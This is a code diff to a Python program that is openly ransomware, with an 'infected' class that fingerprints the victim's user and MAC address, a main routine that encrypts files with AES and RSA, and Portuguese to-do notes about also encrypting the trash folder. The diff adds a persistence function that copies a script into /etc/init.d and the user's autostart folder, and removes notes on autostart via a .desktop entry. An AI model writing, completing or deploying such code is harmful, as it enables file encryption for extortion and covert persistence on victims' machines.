@@ -13,6 +13,7 @@ import subprocess
 import hashlib
 import time
 import threading
+import tempfile
 
 from AES import *
 from RSA import *
@@ -28,11 +29,17 @@ class infected():
         self.id = None
 
     def get_name(self):
-        self.comando = subprocess.Popen('whoami', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.comando = subprocess.Popen('whoami', shell=True
+                                                , stdin=subprocess.PIPE
+                                                , stdout=subprocess.PIPE
+                                                , stderr=subprocess.PIPE)
         self.nome_pc = self.comando.stdout.read().replace('\n','')
 
     def get_id(self):
-        self.comando = subprocess.Popen('ifconfig -a | grep ether', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.comando = subprocess.Popen('ifconfig -a | grep ether', shell=True
+                                                                  , stdin=subprocess.PIPE
+                                                                  , stdout=subprocess.PIPE
+                                                                  , stderr=subprocess.PIPE)
         self.saida = self.comando.stdout.read()
         self.s = self.saida.split()
         self.mac_addr = self.s[1]
@@ -78,26 +85,7 @@ NOVAS COISAS :
 
 
     criptografar lixeira tbm
-    os.path.expanduser('~') + '/.local/share/Trash'
-
-
-    persistencia:
-        https://askubuntu.com/questions/48321/how-do-i-start-applications-automatically-on-login
-    copiar ransomware para -> TEMPDIR
-    file -> ransomware.desktop
-
-    UBUNTU
-    [Desktop Entry]
-    Type=Application
-    Name=<Name of application as displayed>
-    Exec=<command to execute>
-    Icon=<full path to icon>
-    Comment=<optinal comments>
-    X-GNOME-Autostart-enabled=true
-
-    GNOME gnome-session-properties
-
-    criar um sh -> gnome-terminal  -e  "/batch-path/batch-name.sh"
+    os.path.expanduser('~') + '/.local/share/Trash/files/'
 '''
 
 # Starting point of encrypting
@@ -196,12 +184,39 @@ def crypto_all():
     print('[*] Chave privada do cliente criptografada')
 '''
 
-# MAIN
+def persistence():
+    def generate_sh(): # still working around how to make a sh file
+        f = open('gc_script.sh','wb')
+        script = '''
+        ''' # it should be an encoded base64 
+        f.write(script)
+        # it should have -> daemon wating for new files / change wallpaper /
+
+    generate_sh()
+
+    file_name = 'persistence.sh'
+    TEMPDIR = tempfile.gettempdir()
+    subprocess.Popen('cp ' + file_name + ' ' + TEMPDIR, shell=True
+                                                      , stdin=subprocess.PIPE
+                                                      , stdout=subprocess.PIPE
+                                                      , stderr=subprocess.PIPE)
+    os.system('chmod +x persistence_arq.sh')
+    subprocess.Popen('cp ' + os.path.join(TEMPDIR, file_name) + ' /etc/init.d/arq.sh', shell=True
+                                                                                     , stdin=subprocess.PIPE
+                                                                                     , stdout=subprocess.PIPE
+                                                                                     , stderr=subprocess.PIPE)
+    #
+    subprocess.Popen('cp ' + os.path.join(TEMPDIR, file_name) + ' ' + os.path.join(os.path.expanduser('~'), '.config/autostart/'), shell=True
+                                                                                                                                 , stdin=subprocess.PIPE
+                                                                                                                                 , stdout=subprocess.PIPE
+                                                                                                                                 , stderr=subprocess.PIPE)
+
 if __name__ == "__main__":
     crypto_all()
     #change_background()
     #get_user()
-    #pass
+    #persistence()
+    pass
 
 
 
